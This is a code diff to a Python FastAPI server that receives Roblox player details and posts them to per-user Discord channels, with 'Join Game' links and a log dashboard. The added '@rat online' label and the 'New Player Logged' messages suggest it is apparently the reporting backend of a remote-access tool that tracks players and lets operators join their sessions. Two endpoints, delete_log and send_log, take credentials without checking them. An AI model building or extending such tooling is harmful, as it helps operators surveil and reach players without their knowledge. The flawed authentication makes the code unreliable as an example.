@@ -24,7 +24,6 @@ user_channels = {}
 logs = []
 security = HTTPBearer()
 
-
 class Info(BaseModel):
     userid: str
     username: str
@@ -34,10 +33,8 @@ class Info(BaseModel):
     jobid: str
     thumbnail: str
 
-
 class Disconnect(BaseModel):
     userid: str
-
 
 @app.post("/info_report")
 async def info_report(info: Info, request: Request):
@@ -78,7 +75,13 @@ async def info_report(info: Info, request: Request):
             {"name": "Place ID", "value": info.placeid, "inline": False},
             {"name": "Job ID", "value": info.jobid, "inline": False}
         ],
-        "thumbnail": {"url": info.thumbnail}
+        "thumbnail": {
+            "url": info.thumbnail
+        },
+        "author": {
+            "name": "@rat online",
+            "icon_url": "https://cdn.discordapp.com/emojis/1247934146887258213.webp?size=96&quality=lossless"
+        }
     }
 
     message_payload = {
@@ -91,14 +94,14 @@ async def info_report(info: Info, request: Request):
                     {
                         "type": 2,
                         "style": 5,
-                        "label": "Roblox Profile",
-                        "url": f"https://www.roblox.com/users/{info.userid}/profile"
+                        "label": "Join Game",
+                        "url": f"roblox://placeId={info.placeid}&gameInstanceId={info.jobid}"
                     },
                     {
                         "type": 2,
                         "style": 5,
-                        "label": "Join Game",
-                        "url": f"roblox://placeId={info.placeid}&gameInstanceId={info.jobid}"
+                        "label": "View Profile",
+                        "url": f"https://www.roblox.com/users/{info.userid}/profile"
                     }
                 ]
             }
@@ -114,8 +117,19 @@ async def info_report(info: Info, request: Request):
     if message_response.status_code not in [200, 201, 204]:
         raise HTTPException(status_code=500, detail="Failed to send message")
 
-    return {"detail": "Channel and message sent"}
+    log_embed = {
+        "title": "New Player Logged",
+        "description": f"**{info.username}** just joined the game.",
+        "color": 5763719
+    }
 
+    requests.post(
+        f"https://discord.com/api/v10/channels/{log_channel_id}/messages",
+        headers=headers,
+        json={"embeds": [log_embed]}
+    )
+
+    return {"detail": "Channel and message sent"}
 
 @app.post("/disconnect")
 async def disconnect(disconnect: Disconnect):
@@ -134,13 +148,11 @@ async def disconnect(disconnect: Disconnect):
         del user_channels[user_id]
     return {"detail": "Channel deleted if existed"}
 
-
 @app.get("/logs")
 async def get_logs(credentials: HTTPAuthorizationCredentials = Depends(security)):
     if credentials.credentials != dashboard_password:
         raise HTTPException(status_code=403, detail="Unauthorized")
     return logs
-
 
 @app.post("/auth")
 async def auth(req: Dict[str, str]):
@@ -148,13 +160,11 @@ async def auth(req: Dict[str, str]):
         raise HTTPException(status_code=401, detail="Invalid password")
     return {"message": "Authorized"}
 
-
 @app.delete("/logs/{userid}")
 async def delete_log(userid: str, creds: HTTPAuthorizationCredentials = Depends(security)):
     global logs
     logs = [log for log in logs if log["userid"] != userid]
     return {"detail": "Deleted"}
-
 
 @app.post("/send_log/{userid}")
 async def send_log(userid: str, creds: HTTPAuthorizationCredentials = Depends(security)):
@@ -205,6 +215,5 @@ async def send_log(userid: str, creds: HTTPAuthorizationCredentials = Depends(se
             )
             return {"detail": "Sent"}
     raise HTTPException(status_code=404, detail="Log not found")
-
 
 app.mount("/", StaticFiles(directory="dashboard", html=True), name="dashboard")
